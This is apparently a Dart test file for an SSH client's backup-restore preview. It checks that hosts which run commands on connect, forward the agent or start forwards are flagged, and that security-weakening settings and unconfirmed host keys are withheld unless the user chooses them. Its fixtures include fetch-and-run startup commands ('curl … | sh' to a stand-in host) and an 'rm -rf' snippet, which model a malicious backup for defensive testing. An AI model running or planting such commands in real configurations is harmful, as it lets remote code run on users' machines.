import 'dart:convert';
import 'dart:io';

import 'package:drift/drift.dart' hide isNull, isNotNull;
import 'package:drift/native.dart';
import 'package:flutter_secure_storage/flutter_secure_storage.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:zestssh/database/database.dart';
import 'package:zestssh/services/backup_service.dart';
import 'package:zestssh/services/settings_service.dart';
import 'package:zestssh/services/sync_data_service.dart';

import '../helpers/memory_store_backend.dart';

/// A restore says what it would do before anything is written (found
/// in a security review: a backup was restored all
/// at once, unseen, a host that runs a command as it connects, or forwards
/// the agent, among it).
void main() {
  driftRuntimeOptions.dontWarnAboutMultipleDatabases = true;
  const storage = FlutterSecureStorage();

  late AppDatabase here;
  late SyncDataService service;
  late SharedPreferences prefs;
  late SettingsService settings;

  Future<void> host(AppDatabase db, String id, String label,
          {String? startup, String? snippet, bool agent = false, bool monitored = false}) =>
      db.connectionsDao.insertConnection(ConnectionsCompanion(
        id: Value(id),
        label: Value(label),
        host: Value('$id.example.com'),
        port: const Value(22),
        protocol: const Value('ssh'),
        startupCommand: Value(startup),
        snippetId: Value(snippet),
        forwardAgent: Value(agent),
        monitored: Value(monitored),
        createdAt: Value(DateTime.utc(2026, 10, 8)),
        updatedAt: Value(DateTime.utc(2026, 10, 8)),
      ));

  setUp(() async {
    FlutterSecureStorage.setMockInitialValues({});
    SharedPreferences.setMockInitialValues(const {});
    prefs = await SharedPreferences.getInstance();
    settings = SettingsService(prefs);
    here = AppDatabase.forTesting(NativeDatabase.memory());
    addTearDown(here.close);
    service = memoryDataService(here, storage, settings);
    // What this device holds: web-1, and same-4 that the backup holds as it is.
    await host(here, 'h1', 'web-1');
    await host(here, 'h4', 'same-4', startup: 'uptime');
  });

  /// A backup made on another device: web-1 renamed, same-4 as it is here,
  /// and four hosts new here, three of which do something by themselves.
  Future<Map<String, dynamic>> backup() async {
    final there = AppDatabase.forTesting(NativeDatabase.memory());
    addTearDown(there.close);
    final settings = SettingsService(await SharedPreferences.getInstance());
    await host(there, 'h1', 'web-1 renamed');
    await host(there, 'h4', 'same-4', startup: 'uptime');
    await host(there, 'h2', 'agent-2', startup: 'curl -s https://203.0.113.9/x | sh', agent: true);
    await host(there, 'h3', 'watch-3', monitored: true);
    await host(there, 'h5', 'plain-5');
    await host(there, 'h6', 'snippet-6', snippet: 's1');
    final data = await memoryDataService(there, storage, settings).gatherAll();
    data['identities'] = [
      {'id': 'k1', 'name': 'deploy'},
    ];
    data['snippets'] = [
      {'id': 's1', 'label': 'cleanup', 'command': 'rm -rf /tmp/x'},
    ];
    return data;
  }

  test('what a backup holds, what it writes over here, and the hosts that do something by themselves', () async {
    final preview = await service.previewRestore(await backup());

    expect(preview.hosts, 6);
    expect(preview.keys, 1);
    expect(preview.snippets, 1);
    expect(preview.replaces, 1, reason: 'web-1 alone: same-4 is here as the backup holds it');
    expect({for (final (label, acts) in preview.acting) label: acts}, {
      'agent-2': {HostActsAlone.runsCommand, HostActsAlone.forwardsAgent},
      'watch-3': {HostActsAlone.monitored},
      'snippet-6': {HostActsAlone.runsSnippet},
    }, reason: 'same-4 runs a command too, but is here already as it is');
    expect(await here.connectionsDao.getAll(), hasLength(2), reason: 'a preview writes nothing');
  });

  group('a restore', () {
    late File file;

    setUp(() async {
      // A backup without a password (format 2), which reads with no key
      // derivation; the preview is asked the same way for every format.
      final dir = await Directory.systemTemp.createTemp('restore_preview_');
      addTearDown(() => dir.delete(recursive: true));
      final data = await backup();
      data.remove('identities');
      data.remove('snippets');
      file = File('${dir.path}/demo.zest')
        ..writeAsBytesSync([...utf8.encode('ZEST'), 2, ...utf8.encode(jsonEncode(data))]);
    });

    test('the person says no: nothing is written', () async {
      RestorePreview? shown;
      final result = await BackupService(service).importBackup(file.path, '', allowLegacyUnencrypted: true,
          confirm: (preview) async {
        shown = preview;
        return null;
      });
      expect(result.cancelled, isTrue);
      expect(result.success, isFalse);
      expect(shown!.hosts, 6);
      expect((await here.connectionsDao.getAll()).map((c) => c.label).toSet(), {'web-1', 'same-4'});
    });

    test('the person says yes: it is restored', () async {
      final result = await BackupService(service)
          .importBackup(file.path, '', allowLegacyUnencrypted: true, confirm: (_) async => const RestoreChoice());
      expect(result.success, isTrue);
      expect(result.cancelled, isFalse);
      expect((await here.connectionsDao.getAll()).map((c) => c.label).toSet(),
          {'web-1 renamed', 'same-4', 'agent-2', 'watch-3', 'plain-5', 'snippet-6'});
    });
  });

  // A stranger's backup and its password: the preview said "hosts 1, acting
  // nothing", and the questions were off afterwards (found in a security
  // review). Sync from the person's own account does not go through this.
  group('what weakens security', () {
    const weakening = {
      'ask_before_trusting_keys': false,
      'dangerous_command_protection': false,
      'snippet_destructive_confirm': false,
      'notify_security_alerts': false,
      'osc52_clipboard': true,
    };

    Future<File> fileWith(Map<String, dynamic> data) async {
      final dir = await Directory.systemTemp.createTemp('restore_preview_');
      addTearDown(() => dir.delete(recursive: true));
      return File('${dir.path}/demo.zest')..writeAsBytesSync([...utf8.encode('ZEST'), 2, ...utf8.encode(jsonEncode(data))]);
    }

    Future<Map<String, dynamic>> backupWithSettings(Map<String, Object?> settings) async {
      final data = await backup();
      data.remove('identities');
      data.remove('snippets');
      data['settings'] = settings;
      return data;
    }

    test('is listed in the preview, and what would change nothing is not', () async {
      final preview = await service.previewRestore(await backupWithSettings({...weakening, 'default_username': 'root', 'bell_enabled': false}));
      expect(preview.weakens.toSet(), weakening.keys.toSet());

      // Safe values, and what is already as the backup has it here, weaken nothing.
      await settings.setDangerousCommandProtection(false);
      final again = await service.previewRestore(await backupWithSettings({
        'ask_before_trusting_keys': true,
        'dangerous_command_protection': false,
        'osc52_clipboard': false,
      }));
      expect(again.weakens, isEmpty);
    });

    test('stays as it is here unless ticked; the rest of the settings come as ever', () async {
      final data = await backupWithSettings({...weakening, 'default_username': 'root'});
      final result = await BackupService(service).importBackup((await fileWith(data)).path, '',
          allowLegacyUnencrypted: true, confirm: (_) async => const RestoreChoice());
      expect(result.success, isTrue);
      expect(settings.askBeforeTrustingNewKeys, isTrue);
      expect(settings.dangerousCommandProtection, isTrue);
      expect(settings.snippetDestructiveConfirmation, isTrue);
      expect(settings.notifySecurityAlerts, isTrue);
      expect(settings.osc52Clipboard, isFalse);
      expect(prefs.getString('default_username'), 'root');
    });

    test('with nobody asked it stays too', () async {
      final data = await backupWithSettings(weakening);
      await BackupService(service).importBackup((await fileWith(data)).path, '', allowLegacyUnencrypted: true);
      expect(settings.dangerousCommandProtection, isTrue);
      expect(settings.osc52Clipboard, isFalse);
    });

    test('what is ticked comes: a person\'s own backup on a new device', () async {
      final data = await backupWithSettings(weakening);
      await BackupService(service).importBackup((await fileWith(data)).path, '', allowLegacyUnencrypted: true,
          confirm: (preview) async => const RestoreChoice(takeSettings: {'osc52_clipboard', 'dangerous_command_protection'}));
      expect(settings.osc52Clipboard, isTrue);
      expect(settings.dangerousCommandProtection, isFalse);
      expect(settings.askBeforeTrustingNewKeys, isTrue);
    });

    test('sync from the person\'s own account is not this path: restoreAll takes them as ever', () async {
      final data = await backupWithSettings(weakening);
      expect((await service.restoreAll(data)).success, isTrue);
      expect(settings.dangerousCommandProtection, isFalse);
    });

    // Found in a security review: a backup could
    // make this device trust a host key without asking.
    group('host keys', () {
      final past = DateTime.utc(2026, 8, 14).toIso8601String();
      Map<String, Object?> key(String id, String host, String type, String fp,
              {String? device = 'OTHER-PC', String? via}) =>
          {
            'id': id,
            'host': host,
            'port': 22,
            'keyType': type,
            'fingerprint': fp,
            'publicKeyBase64': 'AAAA$id',
            'firstSeen': past,
            'lastSeen': past,
            'recordedDevice': device,
            'viaScope': ?via,
          };

      Future<Map<String, dynamic>> backupWithKeys() async {
        // This device confirmed ed25519 for bastion itself.
        await here.into(here.knownHosts).insert(KnownHostsCompanion(
              id: const Value('mine'),
              host: const Value('bastion.example.com'),
              port: const Value(22),
              keyType: const Value('ssh-ed25519'),
              fingerprint: const Value('SHA256:mine'),
              publicKeyBase64: const Value('AAAAmine'),
              firstSeen: Value(DateTime.utc(2026, 7)),
              lastSeen: Value(DateTime.utc(2026, 7)),
            ));
        final data = await backup();
        data.remove('identities');
        data.remove('snippets');
        data['known_hosts'] = [
          key('k1', 'bastion.example.com', 'ssh-ed25519', 'SHA256:mine'), // as here
          key('k2', 'bastion.example.com', 'ecdsa-sha2-nistp256', 'SHA256:second'), // a second type
          key('k3', 'new.example.com', 'ssh-ed25519', 'SHA256:new'), // new here
          key('k4', 'bare.example.com', 'ssh-ed25519', 'SHA256:bare', device: null), // no provenance
        ];
        return data;
      }

      Future<Set<String>> held() async => {for (final r in await here.knownHostsDao.getAll()) '${r.host} ${r.keyType}'};
      const before = {'bastion.example.com ssh-ed25519'};

      test('those it would trust that this device has not confirmed are named', () async {
        final preview = await service.previewRestore(await backupWithKeys());
        expect(preview.hostKeys, [const RestoreHostKey('new.example.com:22')]);
        expect(await held(), before, reason: 'a preview writes nothing');
      });

      // Found in a review: confirmed here directly, a key
      // for the same host through a jump host is not adopted either, and a
      // host through a jump host is named with its route.
      test('a host confirmed here on one route takes no key for it on another; a route is named', () async {
        final data = await backupWithKeys();
        data['known_hosts'] = [
          key('j1', 'bastion.example.com', 'ecdsa-sha2-nistp256', 'SHA256:jump', via: 'jump.example.com:22'),
          key('j2', 'inner.example.com', 'ssh-ed25519', 'SHA256:inner', via: 'jump.example.com:22'),
        ];
        final preview = await service.previewRestore(data);
        expect(preview.hostKeys, [const RestoreHostKey('inner.example.com:22', via: 'jump.example.com:22')]);
        expect((await service.restoreAll(data)).success, isTrue);
        expect(await held(), {...before, 'inner.example.com ssh-ed25519'},
            reason: 'bastion, confirmed here directly, took no key through the jump host');
      });

      test('are not taken unless ticked, nor with nobody asked', () async {
        final data = await backupWithKeys();
        final result = await BackupService(service).importBackup((await fileWith(data)).path, '',
            allowLegacyUnencrypted: true, confirm: (_) async => const RestoreChoice());
        expect(result.success, isTrue);
        expect(await held(), before);
        await BackupService(service).importBackup((await fileWith(data)).path, '', allowLegacyUnencrypted: true);
        expect(await held(), before);
      });

      test('ticked, the new host comes, unconfirmed here; a second type for a host confirmed here does not', () async {
        final data = await backupWithKeys();
        await BackupService(service).importBackup((await fileWith(data)).path, '', allowLegacyUnencrypted: true,
            confirm: (_) async => const RestoreChoice(takeHostKeys: true));
        expect(await held(), {...before, 'new.example.com ssh-ed25519'});
        expect((await here.knownHostsDao.findHost('new.example.com', 22, 'ssh-ed25519'))!.locallyVerified, isFalse);
      });
    });

    test('Compatibility mode, variables, and a local shell\'s commands are named as what the host does', () async {
      final at = DateTime(2026, 10, 30).toIso8601String();
      final data = await backup();
      data['connections'] = [
        {'id': 'c1', 'label': 'old-router', 'host': 'r.example.com', 'port': 22, 'protocol': 'ssh', 'compatibilityMode': true, 'createdAt': at},
        {'id': 'c2', 'label': 'with-vars', 'host': 'v.example.com', 'port': 22, 'protocol': 'ssh', 'envVars': '{"A":"b"}', 'createdAt': at},
        {'id': 'c3', 'label': 'Prod DB', 'host': 'db.example.com', 'port': 22, 'protocol': 'localShell', 'startupCommand': 'curl evil|sh', 'createdAt': at},
        {'id': 'c4', 'label': 'my-shell', 'host': 'localhost', 'port': 22, 'protocol': 'localShell', 'createdAt': at},
        {'id': 'c5', 'label': 'with-forward', 'host': 'f.example.com', 'port': 22, 'protocol': 'ssh', 'createdAt': at},
      ];
      data['port_forward_rules'] = [
        {'id': 'r1', 'connectionId': 'c5', 'type': 'remote', 'bindPort': 8022, 'remoteHost': '127.0.0.1', 'remotePort': 22, 'createdAt': at},
      ];
      data['port_forward_network_overrides'] = [
        {'id': 'o1', 'ruleId': 'r1', 'networkId': 'system_default', 'state': 'on', 'createdAt': at, 'updatedAt': at},
      ];
      final preview = await service.previewRestore(data);
      expect({for (final (label, acts) in preview.acting) label: acts}, {
        'old-router': {HostActsAlone.compatibilityMode},
        'with-vars': {HostActsAlone.setsVariables},
        'Prod DB': {HostActsAlone.runsHere},
        'with-forward': {HostActsAlone.startsForward},
      });
    });
  });
}
